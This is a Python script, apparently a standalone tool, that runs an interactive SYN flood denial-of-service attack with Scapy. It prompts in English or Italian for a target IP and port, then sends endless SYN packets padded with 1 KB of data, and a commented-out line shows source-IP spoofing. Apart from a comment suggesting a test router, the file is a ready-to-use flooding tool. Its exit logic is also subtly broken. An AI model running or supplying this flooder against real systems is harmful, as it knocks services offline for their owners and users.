from scapy.all import *
from scapy.layers.inet import IP, TCP


def get_lang_and_mode(mode):
    with open("lang.txt","r") as lang_file:
        list_ = lang_file.readlines()
        language = list_[0]
        if mode == "":
            if len(list_) == 2:
                mode = list_[1]
            else:
                mode = "terminal"
        lang_list = list(language)
        if lang_list[-1] == "\n":
            lang_list.pop()
        language = "".join(lang_list)
        if len(list_) >= 2:
            mode = list_[1]
            with open("lang.txt","w") as lang_file:
                lang_file.write(language)
    return language, mode


def syn_flooder(language, target_ip, target_port):
    # forge IP packet with target ip as the destination IP address
    target_ip = IP(dst=target_ip)
    # This is for performing IP Spoofing
    # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
    tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
    # Adding flooding data (1 KB in this case)
    raw = Raw(b"X"*1024)
    # Stack up the layers
    p = target_ip / tcp_layer / raw
    send(p, loop=1, verbose=0)


def main():
    mode = ""
    language, mode = get_lang_and_mode(mode)
    # print(f"{language}, {mode}")
    loop = True
    while loop == True:
        # target IP address (should be a testing router/firewall)
        if language == "English":
            target_ip = input("Insert the IP address to attack --> ")
            if target_ip == "exit":
                print("Goodbye!\n")
                break
            target_port = input("Insert the target port to flood --> ")
            if target_port == "exit":
                print("Goodbye!\n")
                break
        else:
            target_ip = input("Inserisci l'indirizzo IP da attaccare --> ")
            if target_ip == "exit":
                print("Arrivederci!\n")
                break
            target_port = input("Inserisci la porta di destinazione da floodare --> ")
            if target_port == "exit":
                print("Arrivederci!\n")
                break
        syn_flooder(language, target_ip, target_port)
        while True:
                if language == "English":
                    exit_choice = input("DO YOU WANT TO EXIT THE PROGRAM? [Y/n]: ")
                else:
                    exit_choice = input("VUOI USCIRE DAL PROGRAMMA? [Y/n]: ")
                exit_choice = exit_choice.lower()
                if exit_choice == "y" or exit_choice == "yes":
                    if language == "English":
                        print("GOODBYE!\n")
                    else:
                        print("ARRIVEDERCI!\n")
                    loop = False
                    break
                elif exit_choice != "n" or exit_choice != "no":
                    if language == "English":
                        print("RETURNING TO THE MENU!\n")
                    else:
                        print("RITORNO AL MENÙ!\n")
                    if mode == "menu":
                        with open("lang.txt", "a") as lang_file:
                            lang_file.write("\nmenu")
                        subprocess.Popen("syn_flooder.bat", shell=True)
                        sys.exit()
                    else:
                        break


if __name__ == "__main__":
    main()
